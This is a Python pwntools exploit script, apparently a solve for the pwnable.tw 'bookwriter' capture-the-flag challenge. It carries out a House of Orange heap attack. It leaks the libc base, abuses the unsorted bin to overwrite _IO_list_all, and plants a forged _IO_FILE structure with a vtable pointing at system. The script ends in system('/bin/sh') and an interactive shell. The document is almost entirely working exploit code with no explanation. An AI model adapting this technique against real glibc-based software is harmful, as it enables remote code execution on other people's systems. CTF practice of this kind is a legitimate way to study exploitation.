from pwn import *

e = ELF("./bookwriter")
libc = ELF("./libc_64.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10304)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

nums = 0
def alloc(size=0x68, payload="AAAA"):
  global nums

  p.sendline("1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", payload)
  p.recvuntil(":")

  nums += 1
  return nums - 1

def edit(idx, payload):
  p.sendline("3")
  p.sendlineafter(":", str(idx))
  p.sendafter(":", payload)
  p.recvuntil(":")

p.sendlineafter(":", "A")
p.recvuntil(":")

alloc(0xc00 - 8, "B" * 8)
alloc(0x1ec00 - 8, "B" * 8)
A = alloc(0x400 - 8, "A" * (0x400 - 8))
edit(A, "A" * (0x400 - 8))
edit(A, "A" * (0x400 - 8) + "\x01\x04")

F = alloc(0x1000)

L = alloc(0xe0 - 8, "A")


p.sendline("2")
p.sendlineafter(":", str(L))
p.recvuntil(":\n")
libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f3049272f41 + 0x00007f3048eaf000
print("Libc Base: {:#x}".format(libc_base))
p.recvuntil(":")

edit(L, "A" * (0xe0 - 8))
edit(L, "A" * (0xe0 - 8) + "\x00\x23")

p.sendline("4")
p.sendlineafter("?", "1")
p.sendafter("Author :", p64(libc_base + libc.symbols["system"]))
p.recvuntil("choice :")

alloc(0x1330 - 8 - 0x1010)

edit(F, 
  (
    ("/bin/sh\x00" # _IO_OVERFLOW(fp) => system("/bin/sh\x00") 
      + p64(0x61) # size 
      + p64(0) 
      + p64(libc_base + libc.symbols["_IO_list_all"] - 0x10)
      + p64(0) + p64(123) # 0 < 123
    ).ljust(0xc0, "\x00")  
    + p64(0) # mode
  ).ljust(0xd8, "\x00") 
  + p64(0x602060 - 0x18) # vtable
) 

p.sendline("1")
p.sendlineafter(":", "1")

p.interactive()
